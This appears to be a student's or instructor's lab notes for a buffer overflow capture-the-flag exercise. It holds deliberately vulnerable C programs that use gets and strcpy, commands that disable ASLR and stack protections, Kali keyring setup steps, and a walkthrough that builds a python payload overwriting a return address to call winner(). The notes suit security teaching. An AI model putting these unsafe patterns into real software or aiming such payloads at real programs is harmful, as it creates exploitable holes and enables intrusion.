CTF – Buffer overflow
sudo sysctl -w kernel.randomize_va_space=0
Task:
A. using the following C application:
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void winner()
{
 printf("flow changed\n");
}
int main(int argc, char **argv)
{
 char buffer[50];
 gets(buffer);
 printf("exit\n");
}
Compile this application and perform a buffer overflow to cause execution of the winner() function.
B. Using the following application:
#include <stdio.h>
#include <string.h>
int main (int argc, char** argv){
 //Make a buffer make this bigger than the minimum you will need
 //You will want to make this large enough to fit shell code and lots of nops
 char buffer[500];
 //copy cmdline input into the buffer.
 strcpy(buffer, argv[1]);
 //return 0 because that is what we do if stuff exits normally.
 return 0;
}
Execute some shell code to gain a shell as the user who the code is executed as.
C.
Write up what you have done, how you did it and what protections exist to make it hard to do. 


Findin the offset can be easy
● Metasplot has a pattern-create tool.
● Download it from github.
● https://raw.githubusercontent.com/rapid7/metasploit-framewor
k/master/tools/exploit/pattern_create.rb
● You need ruby to run this.
● gem install reg-text
● ruby ./pattern_create.rb -l 1000
● You can then use the sister script to find the pos

gcc -m32 -fno-stack-protector -z execstack -nopie -g bad.c -o badcode 

::: notes
If you have a problem with these instructions and apt failing because of keys. 

sudo wget https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-keyring.asc

If you have a missing public key replace F6BC with the key you need:

sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys F6BC


# download
wget http://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2024.1_all.deb
# install
sudo dpkg -i kali-archive-keyring_2024.1_all.deb
# remove downloaded file again
rm kali-archive-keyring_2024.1_all.deb
# update
sudo apt-get update

sudo apt install gcc-multilib

gcc -m32 -fno-stack-protector -z execstack -Wno-implicit-function-declaration -o badcode bad.c

Login to your lab VM. 
No need to startx 

0. write the code 

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void winner()
{
 printf("flow changed\n");
}

int main(int argc, char **argv)
{
 char buffer[64];
 gets(buffer);
 printf("exit\n");
}

```

1. compile with some flags 
```
gcc -g -fno-stack-protector -z execstack -no-pie example.c -o example.exe

```

2. run objdump -d
Note: winner is at 

```
0000000000401136 <winner>:
```

Written backwards in hex 
\x36\x11\x40\x00\x00\x00\x00\x00

3. find through trail and error where you go to cause an overflow (71)
```
 r < <(python2.7 -c "print('A'*71)")

```

4. Stitch it together 
python2.7 -c "print('A'*72+'\x36\x11\x40\x00\x00\x00\x00\x00')" | ./example.exe

Note this can also be run inside gdb.

python2.7 -c "print('A'*72 + '\x9d\x11\x00\x00\x00\x00\x00\x00')" | ./badcode.exe

./badcode.exe <<< $(msf-pattern_create -l 100)

